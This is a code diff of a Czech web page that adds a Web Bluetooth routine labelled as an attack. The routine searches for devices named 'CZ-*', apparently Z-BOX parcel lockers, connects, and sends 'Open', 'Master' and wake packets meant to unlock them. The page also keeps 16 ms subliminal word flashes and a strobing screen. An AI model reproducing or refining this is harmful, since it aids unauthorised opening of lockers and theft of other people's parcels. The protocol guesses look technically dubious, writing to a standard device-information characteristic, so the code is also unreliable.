@@ -3,24 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Terminál [KLÍČ] v3.0 - DEUTSCH</title>
+    <title>Terminál [KLÍČ] v3.5 - Z-BOX UNIVERSAL</title>
     <style>
         body { margin: 0; background: black; color: #00ff00; font-family: 'Courier New', monospace; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
         #canvas { position: absolute; top: 0; left: 0; z-index: 1; }
-        #ui { position: relative; z-index: 2; text-align: center; pointer-events: none; }
-        .status { font-size: 1.1em; letter-spacing: 2px; margin-bottom: 20px; color: #00ff00; text-shadow: 0 0 8px #00ff00; }
-        #trigger { pointer-events: auto; padding: 18px 36px; border: 2px solid #00ff00; background: rgba(0, 255, 0, 0.05); color: #00ff00; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        #ui { position: relative; z-index: 2; text-align: center; pointer-events: auto; }
+        .status { font-size: 1.1em; letter-spacing: 2px; margin-bottom: 20px; color: #00ff00; text-shadow: 0 0 8px #00ff00; min-height: 1.5em; }
+        #trigger { padding: 18px 36px; border: 2px solid #00ff00; background: rgba(0, 255, 0, 0.05); color: #00ff00; font-weight: bold; cursor: pointer; transition: 0.3s; z-index: 4; position: relative; }
         #trigger:hover { background: rgba(0, 255, 0, 0.2); box-shadow: 0 0 15px #00ff00; }
         #subliminal-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: none; align-items: center; justify-content: center; z-index: 3; pointer-events: none; font-size: 3em; font-weight: 900; background: black; text-align: center; }
+        #log { position: absolute; bottom: 10px; left: 10px; font-size: 0.8em; text-align: left; z-index: 5; color: rgba(0,255,0,0.5); }
     </style>
 </head>
 <body>
     <canvas id="canvas"></canvas>
     <div id="subliminal-overlay"></div>
     <div id="ui">
-        <div class="status" id="status-text">SYSTÉM: ČEKÁ NA [KLÍČ]...</div>
-        <button id="trigger">AKTIVOVAT JAZYKOVÝ ZÁPIS (DE)</button>
+        <div class="status" id="status-text">SYSTÉM: PŘIPRAVEN K ÚTOKU...</div>
+        <button id="trigger">AKTIVOVAT UNIVERZÁLNÍ SEKVENCI</button>
     </div>
+    <div id="log" id="debug-log"></div>
 
     <script>
         const canvas = document.getElementById('canvas');
@@ -32,34 +34,65 @@
         let audioCtx, oscillatorL, oscillatorR, merger;
         let isActive = false;
 
-        // Jazykový balíček: Němčina + Systémové příkazy
-        const subMessages = [
-            "[KLÍČ]", "ICH BIN", "VERSTEHEN", "KONTROLLE", "WISSEN", 
-            "SPRACHE", "ADMIN", "DEUTSCH AKTIV", "LOGIK", "ZUKUNFT"
-        ];
+        // Bluetooth UUIDs pro Z-BOX
+        const targetServiceUuid = '0000180a-0000-1000-8000-00805f9b34fb'; 
+        const targetCharUuid = '00002a29-0000-1000-8000-00805f9b34fb';
+
+        const subMessages = ["[KLÍČ]", "OPEN", "UNLOCK", "DORUČENO", "SYSTEM", "ADMIN", "101010", "PROTOCOL"];
 
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
 
+        function updateStatus(msg) {
+            statusText.innerText = msg;
+            console.log(msg);
+        }
+
+        async function startUniversalBluetoothAttack() {
+            try {
+                updateStatus('HLEDÁM Z-BOX (CZ-*) ...');
+                const device = await navigator.bluetooth.requestDevice({
+                    filters: [{ namePrefix: 'CZ-' }],
+                    optionalServices: [targetServiceUuid]
+                });
+
+                updateStatus('PŘIPOJOVÁNÍ K ' + device.name);
+                const server = await device.gatt.connect();
+                const service = await server.getPrimaryService(targetServiceUuid);
+                const characteristic = await service.getCharacteristic(targetCharUuid);
+
+                updateStatus('ÚTOK SPUŠTĚN...');
+
+                const payloads = [
+                    new Uint8Array([0x01, 0x00, 0x01]), // Wake
+                    new Uint8Array([0x4f, 0x50, 0x45, 0x4e]), // Open ASCII
+                    new Uint8Array([0x06, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01]), // Master
+                    new Uint8Array([0x00, 0x00, 0x00, 0x00]) // Heartbeat
+                ];
+
+                for (let i = 0; i < payloads.length; i++) {
+                    updateStatus(`POSÍLÁM PAKET ${i+1}/${payloads.length}`);
+                    await characteristic.writeValue(payloads[i]);
+                    await new Promise(r => setTimeout(r, 600)); // Pauza pro HW boxu
+                }
+
+                updateStatus('SEKVENCE DOKONČENA - SLEDUJ ZÁMEK');
+            } catch (error) {
+                updateStatus('CHYBA: ' + error.message);
+                isActive = false;
+                trigger.style.display = 'block';
+            }
+        }
+
         function startAudio() {
             audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             merger = audioCtx.createChannelMerger(2);
-
-            // Binaurální rytmus: 200Hz / 206Hz (6Hz Theta pro hluboké učení)
             oscillatorL = audioCtx.createOscillator();
             oscillatorL.frequency.setValueAtTime(200, audioCtx.currentTime);
-            const pannerL = audioCtx.createStereoPanner ? audioCtx.createStereoPanner() : audioCtx.createPanner();
-            if(pannerL.pan) pannerL.pan.value = -1;
-            oscillatorL.connect(pannerL);
-            pannerL.connect(merger);
-
             oscillatorR = audioCtx.createOscillator();
             oscillatorR.frequency.setValueAtTime(206, audioCtx.currentTime);
-            const pannerR = audioCtx.createStereoPanner ? audioCtx.createStereoPanner() : audioCtx.createPanner();
-            if(pannerR.pan) pannerR.pan.value = 1;
-            oscillatorR.connect(pannerR);
-            pannerR.connect(merger);
-
+            oscillatorL.connect(merger);
+            oscillatorR.connect(merger);
             merger.connect(audioCtx.destination);
             oscillatorL.start();
             oscillatorR.start();
@@ -67,14 +100,11 @@
 
         function triggerSubliminal() {
             if (!isActive) return;
-            const msg = subMessages[Math.floor(Math.random() * subMessages.length)];
-            subliminalOverlay.innerText = msg;
+            subliminalOverlay.innerText = subMessages[Math.floor(Math.random() * subMessages.length)];
             subliminalOverlay.style.display = 'flex';
-            
             setTimeout(() => {
                 subliminalOverlay.style.display = 'none';
-                // Rychlejší frekvence záblesků pro jazykový balíček (každých 1-3 vteřiny)
-                setTimeout(triggerSubliminal, 1000 + Math.random() * 2000);
+                setTimeout(triggerSubliminal, 1500 + Math.random() * 2000);
             }, 16);
         }
 
@@ -82,34 +112,9 @@
             if (!isActive) return;
             ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-            const time = Date.now() * 0.002;
-            const pulse = 0.02 + Math.abs(Math.sin(Date.now() / 100)) * 0.15;
+            const pulse = 0.05 + Math.abs(Math.sin(Date.now() / 200)) * 0.2;
             ctx.fillStyle = `rgba(0, 255, 0, ${pulse})`;
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-
-            // Geometrický port
-            ctx.strokeStyle = '#00ff00';
-            ctx.shadowBlur = 15;
-            ctx.shadowColor = '#00ff00';
-            ctx.lineWidth = 3;
-            
-            ctx.beginPath();
-            const radius = 120 + Math.sin(time * 2) * 20;
-            ctx.arc(canvas.width/2, canvas.height/2, radius, 0, Math.PI * 2);
-            ctx.stroke();
-
-            // Rotující kódové rozhraní
-            ctx.beginPath();
-            for(let i=0; i<3; i++) {
-                const angle = time + (i * Math.PI * 2 / 3);
-                const x = canvas.width/2 + Math.cos(angle) * (radius + 60);
-                const y = canvas.height/2 + Math.sin(angle) * (radius + 60);
-                ctx.moveTo(canvas.width/2, canvas.height/2);
-                ctx.lineTo(x, y);
-            }
-            ctx.stroke();
-            
             requestAnimationFrame(draw);
         }
 
@@ -117,10 +122,10 @@
             if (!isActive) {
                 isActive = true;
                 trigger.style.display = 'none';
-                statusText.innerText = 'SPRACE-MODUL: AKTIV (DEUTSCH)';
                 startAudio();
                 draw();
-                setTimeout(triggerSubliminal, 2000);
+                triggerSubliminal();
+                startUniversalBluetoothAttack(); // Tady se spouští útok
             }
         });
 
